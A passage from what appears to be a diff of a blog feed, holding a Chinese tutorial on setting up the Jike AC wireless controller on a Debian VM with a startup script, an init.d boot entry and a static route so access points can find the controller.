+<p>到这里其实就可以直接运行集客AC了，但还可以再做一些工作完善一下。</p>
+<h6 id="5-4-设置集客AC开机启动"><a href="#5-4-设置集客AC开机启动" class="headerlink" title="5.4 设置集客AC开机启动"></a>5.4 设置集客AC开机启动</h6><p>首先我们设置Debian这个虚拟机在宿主机ESXi启动时自动启动，在ESXi虚拟机列表右键Debian弹出菜单点击自动启动，启用它。</p>
+<p>在Debian刚刚放集客AC的目录下面再新建一个脚本固定一下ac启动的参数，根据官方的说明<a href="http://file.cnrouter.com/upload/gac/%E5%90%AB%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E7%89%88%E6%9C%AC%EF%BC%88%E4%B8%BB%E8%A6%81%E7%94%A8%E4%BA%8E%E7%8B%AC%E7%AB%8B%E4%BD%BF%E7%94%A8%EF%BC%89/%E8%BF%90%E8%A1%8C%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E.txt">file.cnrouter.com/upload/gac/含登录页面版本（主要用于独立使用）/运行参数说明.txt</a>，可选参数非常少并且简单易懂，其间也给出了启动示例，只需要关心<code>-p</code>和<code>-mp</code>自定义一下控制器端口和管理页面端口，<code>-f</code>和<code>-dbpath</code> 自定义一下上传文件目录和数据库目录即可</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/jike</span><br><span class="line">touch ac_run.sh</span><br><span class="line">chmod +x ac_run.sh</span><br></pre></td></tr></table></figure>
+
+<p>在<code>ac_run.sh</code>写上运行ac_linux_amd64_V2.2_202503181710的命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">nohup ./ac_linux_amd64_V2.2_202503181710 -p 60650 -mp 80 -f ./upload/ -dbpath ./ -token 1 -lang zh -https 0 -isonlyoneprot 0 &gt;ac_linux_amd64.log&amp;</span><br></pre></td></tr></table></figure>
+
+<p>接着加入开机启动脚本</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/init.d</span><br><span class="line">touch jike.sh</span><br><span class="line">chmod +x jike.sh</span><br></pre></td></tr></table></figure>
+
+<p>在<code>jike.sh</code>写上执行ac_run.sh的命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### BEGIN INIT INFO</span></span><br><span class="line"><span class="comment"># Provides: jike_ac</span></span><br><span class="line"><span class="comment"># Required-Start: $network $remote_fs $local_fs</span></span><br><span class="line"><span class="comment"># Required-Stop: $network $remote_fs $local_fs</span></span><br><span class="line"><span class="comment"># Default-Start: 2 3 4 5</span></span><br><span class="line"><span class="comment"># Default-Stop: 0 1 6</span></span><br><span class="line"><span class="comment"># Short-Description: run jike ac</span></span><br><span class="line"><span class="comment"># Description: run jike ac</span></span><br><span class="line"><span class="comment">### END INIT INFO</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /etc/jike</span><br><span class="line">./ac_run.sh</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure>
+
+<p>加入开机启动，重启一下Debian检查下开机启动是否成功</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-rc.d jike.sh defaults</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
+
+<h6 id="5-5：设置AC控制器，下发AP配置"><a href="#5-5：设置AC控制器，下发AP配置" class="headerlink" title="5.5：设置AC控制器，下发AP配置"></a>5.5：设置AC控制器，下发AP配置</h6><p>把电脑改为与6.7.8.9同一网段，访问6.7.8.9进入AC控制器的管理页面。管理页面上说明写着“无线AP可以跨VLAN，子网，三层交换机，路由器和防火墙找到本AC”，“在未隔离广播的情况下，子网6.7.8.9/255.255.255.0内的AP可以通过广播的方式自动发现本AC”，“也可以通过在核心交换机上添加一条到6.7.8.9/32,下一跳为6.7.8.9的静态路由来让AP发现本AC”。</p>
+<p>按理说，把所有刷好AP固件的路由器LAN口接入到局域网中，网络配置无误的情况下在AC管理页面的无线AP列表会显示出所有AP。</p>
+<blockquote>
+<p>踩坑：</p>
+<p>我把路由器接入到局域网中之后，在子网内AC无法发现AP，折腾了一番只能选择去OpenWrt主路由添加一条静态路由。接口选局域网的接口，路由类型选单播，目标填6.7.8.9/32，网关填0.0.0.0。添加这条静态路由之后，不仅6.6.6.6的AP路由器能连通到AC的6.7.8.9，整个局域网都能连通到6.7.8.9了。</p>
+</blockquote>
+<p>在AC控制器管理页面新增模板，设置好WIFI的各个参数，再把模板下发给所有AP路由器即可，接着选择所有AP路由器修改密码，对每台AP单独命名。至此，集客AC部署设置完成。</p>
+]]></content>
   </entry>
   <entry>
     <title>chai版本问题</title>
